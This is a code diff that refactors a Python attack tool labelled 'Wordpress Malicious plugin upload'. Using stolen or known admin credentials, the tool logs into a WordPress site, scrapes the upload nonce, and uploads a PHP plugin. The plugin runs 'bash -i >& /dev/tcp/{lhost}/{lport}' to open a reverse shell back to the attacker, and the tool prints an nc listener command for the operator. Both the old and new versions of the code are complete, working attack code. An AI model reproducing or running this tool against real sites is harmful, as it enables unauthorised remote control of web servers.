@@ -9,22 +9,21 @@ from urllib3 import disable_warnings, exceptions
 
 disable_warnings(exceptions.InsecureRequestWarning)
 
-parser = ArgumentParser(
-    description="Wordpress Malicious plugin upload",
-    epilog="./app.py -t http://domain_name.com/wordpress -u User_Admin -p Pass -L 192.168.20.2 -P 4040"
-    )
-parser.add_argument("-t", "--target", metavar="", type=str, help="Target URL")
-parser.add_argument("-u", "--username", metavar="", type=str, help="Wordpress Username")
-parser.add_argument("-p", '--password', metavar="", type=str, help="Wordpress Password")
-parser.add_argument("-L", "--LHOST", metavar="", type=str, help="Attacker IP address")
-parser.add_argument("-P", "--LPORT", metavar="", type=int, help="Attacker LOCAL PORT")
-args = parser.parse_args()
+def arguments():
 
-host = args.target
-username_value = args.username
-password_value = args.password
-LHOST = args.LHOST
-LPORT = args.LPORT
+    parser = ArgumentParser(
+        description="Wordpress Malicious plugin upload",
+        epilog="./app.py -t http://domain_name.com/wordpress -u User_Admin -p Pass -L 192.168.20.2 -P 4040"
+        )
+    
+    parser.add_argument("-t", "--target", metavar="", type=str, help="Target URL")
+    parser.add_argument("-u", "--username", metavar="", type=str, help="Wordpress Username")
+    parser.add_argument("-p", '--password', metavar="", type=str, help="Wordpress Password")
+    parser.add_argument("-L", "--lhost", metavar="", type=str, help="Attacker IP address")
+    parser.add_argument("-P", "--lport", metavar="", type=int, help="Attacker LOCAL PORT")
+    args = parser.parse_args()
+
+    return args.target, args.username, args.password, args.lhost, args.lport
 
 
 def logo():
@@ -45,25 +44,29 @@ def logo():
 
 class Script:
 
-    payload = f"""<?php
-    /**
-    * Plugin Name: Reverse Shell Plugin
-    * Plugin URI:
-    * Description: Reverse Shell Plugin
-    * Version: 1.0
-    * Author: This is a copy, bruh
-    * Author URI: http://www.sevenlayers.com
-    */
-    exec("/bin/bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'");
-    ?>"""
+    def __init__(self, host, lhost, lport):
+        
+        self.host, self.lhost, self.lport = host, lhost, lport
+        
+        self.payload = f"""<?php
+        /**
+        * Plugin Name: Reverse Shell Plugin
+        * Plugin URI:
+        * Description: Reverse Shell Plugin
+        * Version: 1.0
+        * Author: This is a copy, bruh
+        * Author URI: http://www.sevenlayers.com
+        */
+        exec("/bin/bash -c 'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1'");
+        ?>"""
 
-    nonce_pattern = 'value="[0-9a-z]{10}"'                                      
-    headers = {'user-agent': "Linux Mozilla 5/0", 'Accept-Encoding' : 'none'}
-    shell_directory = (''.join(choice(ascii_lowercase) for i in range(7)))
-    activate_shell = f"{host}/wp-content/plugins/{shell_directory}/shell.php"
+        self.nonce_pattern = 'value="[0-9a-z]{10}"'                                      
+        self.headers = {'user-agent': "Linux Mozilla 5/0", 'Accept-Encoding' : 'none'}
+        self.shell_directory = (''.join(choice(ascii_lowercase) for i in range(7)))
+        self.activate_shell = f"{self.host}/wp-content/plugins/{self.shell_directory}/shell.php"
 
 
-    def Upload_plugin(self,session,nonce):
+    def Upload_plugin(self, session, nonce):
 
         f = open("shell.php", "w")
         f.write(self.payload)
@@ -78,7 +81,7 @@ class Script:
             "pluginzip": (self.shell_directory+".zip", open("rev.zip", "rb")),
             'install-plugin-submit': (None,'Install Now'),
             '_wpnonce': (None, nonce),
-            '_wp_http_referer': (None, host + '/wp-admin/plugin-install.php?tab=upload'),
+            '_wp_http_referer': (None, self.host + '/wp-admin/plugin-install.php?tab=upload'),
             'install-plugin-submit': (None,'Install Now')
         }
 
@@ -88,7 +91,7 @@ class Script:
 
         try:
             session.post(
-                url=host + "/wp-admin/update.php?action=upload-plugin",
+                url=self.host + "/wp-admin/update.php?action=upload-plugin",
                 files=file,
                 headers=self.headers,
                 verify=False,
@@ -106,10 +109,10 @@ class Script:
             print("***" * 20 + "\n")
 
     
-    def exploit(self,session):
+    def exploit(self, session):
 
         find_install_dir = session.get(
-            url=host + "/wp-admin/plugin-install.php?tab=upload",
+            url=self.host + "/wp-admin/plugin-install.php?tab=upload",
             headers=self.headers,
             verify=False,
             timeout=35
@@ -135,16 +138,16 @@ class Script:
             print("\n[X] Could not find <plugin-install.php> in the target dashboard?!\n")
 
 
-    def main(self,username,password):
+    def login(self, username, password):
 
         session = Session()
 
         try:
-            if session.get(url=host + "/wp-login.php").status_code == 200:
+            if session.get(url=self.host + "/wp-login.php").status_code == 200:
                 try_login = session.post(
 
-                    url=host + "/wp-login.php",
-                    data={"log": username, "pwd": password, 'redirect_to': host + '/wp-admin/'},
+                    url=self.host + "/wp-login.php",
+                    data={"log": username, "pwd": password, 'redirect_to': self.host + '/wp-admin/'},
                     headers=self.headers,
                     allow_redirects=False,
                     verify=False,
@@ -174,13 +177,14 @@ class Script:
             return "\n[?] Could not connect to the target URL\n"
 
 
-if __name__ == '__main__':
+def main():
 
-    run = Script()
+    host, username_value, password_value, lhost, lport = arguments()
+    run = Script(host, lhost, lport)
 
     try:
         if host is not None and username_value is not None and password_value is not None \
-            and LHOST is not None and LPORT is not None:
+            and lhost is not None and lport is not None:
 
             if host[-1] == "/":
                 host = host[:-1]
@@ -188,12 +192,12 @@ if __name__ == '__main__':
                 pass
 
             print(logo())
-            print(f"[!] ---> execute [nc -lvp {LPORT}]\n")
+            print(f"[!] ---> execute [nc -lvp {lport}]\n")
 
             print("===" * 15)
             print("[+] Starting...")
             print("===" * 15 + "\n")
-            print(run.main(username_value, password_value))
+            print(run.login(username_value, password_value))
 
         else:
             print("\nUSAGE: python3 Malicious.py -t <TARGET IP OR DOMAIN> -u <USERNAME> -p <PASSWORD> -L <LOCAL IP> -P <LOCAL PORT>\n")
@@ -204,3 +208,6 @@ if __name__ == '__main__':
     except IOError:
         exit()
 
+
+if __name__ == '__main__':
+    main()
